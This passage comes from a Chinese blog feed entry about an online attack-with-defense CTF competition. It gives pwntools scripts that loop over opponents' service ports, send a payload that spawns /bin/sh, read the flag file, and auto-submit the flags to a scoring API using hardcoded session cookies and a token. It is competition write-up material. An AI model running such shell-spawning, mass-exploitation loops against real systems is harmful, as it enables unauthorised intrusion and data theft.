flag'</span>)</span><br><span class="line">flag = sh.recvall(timeout= <span class="number">1</span>)</span><br><span class="line">log.success(flag)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'KeyError'</span>)</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'IndexError'</span>)</span><br><span class="line"><span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'TypeError'</span>)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'ValueError'</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="comment"># if ip[7:9] == "16" or ip[7:9] == "17" or ip[7:8] == "8" or ip[7:8] == "6":</span></span><br><span class="line"><span class="comment"># continue</span></span><br><span class="line"></span><br><span class="line">get_flag(ip)</span><br></pre></td></tr></table></figure><h2 id="自动提交脚本"><a href="#自动提交脚本" class="headerlink" title="自动提交脚本"></a>自动提交脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tjflag1</span><span class="params">(flag)</span>:</span></span><br><span class="line"></span><br><span class="line">    url=<span class="string">"http://39.100.119.37:8080/api/v1/challenges/attempt"</span></span><br><span class="line">    <span class="comment">#data=&#123;"challenge_id":2,"submission":""+flag+""&#125;</span></span><br><span class="line">    data=<span class="string">'&#123;"challenge_id":2,"submission":"'</span>+flag+<span class="string">'"&#125;'</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"</span>,</span><br><span class="line"><span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,</span><br><span class="line"><span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line"><span class="string">"CSRF-Token"</span>:<span class="string">"e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a"</span>,</span><br><span class="line"><span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line"><span class="string">"Content-Type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">"session"</span>:<span class="string">"2deefa03-cda6-41fc-be25-a986067c7048"</span>,<span class="string">"PHPSESSID"</span>:<span class="string">"jnr3quolg5o2ohlifbdld6bku5"</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    print(req.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ftjflag1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./web2.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            print(a.strip())</span><br><span class="line">            tjflag1(a.strip())</span><br><span class="line">ftjflag1()</span><br></pre></td></tr></table></figure><h3 id="整理flag的正则"><a href="#整理flag的正则" class="headerlink" title="整理flag的正则"></a>整理flag的正则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag=re.findall(r&apos;flag&#123;[a-zA-Z0-9\-]*&#125;&apos;, data)[0]</span><br><span class="line">            flag_file.write(flag+&quot;\n&quot;)</span><br></pre></td></tr></table></figure><h2 id="0x3-第二次awd-pwn1脚本"><a href="#0x3-第二次awd-pwn1脚本" class="headerlink" title="0x3 第二次awd pwn1脚本"></a>0x3 第二次awd pwn1脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">token = <span class="string">"7hQvn3AnHrtjaFmFN2MxztbCM4hGRQECZKEvJzu2dtSfU"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ips=[]</span><br><span class="line"></span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"How long is your secret?\n"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"So,tell me your secret:\n"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">'Which secret do you want to drop off?'</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fo = open(<span class="string">"foo.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">28</span>):</span><br><span class="line"></span><br><span class="line">ips.append(<span class="string">"1"</span> + str(i).rjust(<span class="number">2</span>,<span class="string">'0'</span>) + <span class="string">"80"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print ips</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> sh</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'39.100.119.37'</span>, int(ip,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./pwn')</span></span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">'iwanaflag'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sh.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span> * <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'4. exit'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Here is shell box!\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'ls\x00,/bin/sh'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">sh = get_shell(ip)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.sendline('cat flag')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line">flag = sh.recvall(timeout=<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">fo.write(flag)</span><br><span class="line"></span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">print(<span class="string">'KeyError'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">print(<span class="string">'IndexError'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">print(<span class="string">'TypeError'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">print(<span class="string">'ValueError'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"></span><br><span class="line"><span class="comment"># if ip[7:9] == "16" or ip[7:9] == "17" or ip[7:8] == "8" or ip[7:8] == "6":</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># continue</span></span><br><span class="line"></span><br><span class="line">get_flag(ip)</span><br></pre></td></tr></table></figure><p>python经常碰到一些缩进问题的报错，很烦人</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h2&gt;&lt;p&gt;第一次线上awd，交flag是交的真的爽，也算是对awd的流程有所熟悉了。题目不难，但是深感自己写脚本速度还是不够快。&lt;/p&gt;
    
    </summary>
    
      <category term="awd" scheme="wood1314.github.io/categories/awd/"/>
    
    
      <category term="awd" scheme="wood1314.github.io/tags/awd/"/>
    
  </entry>
  
</feed>
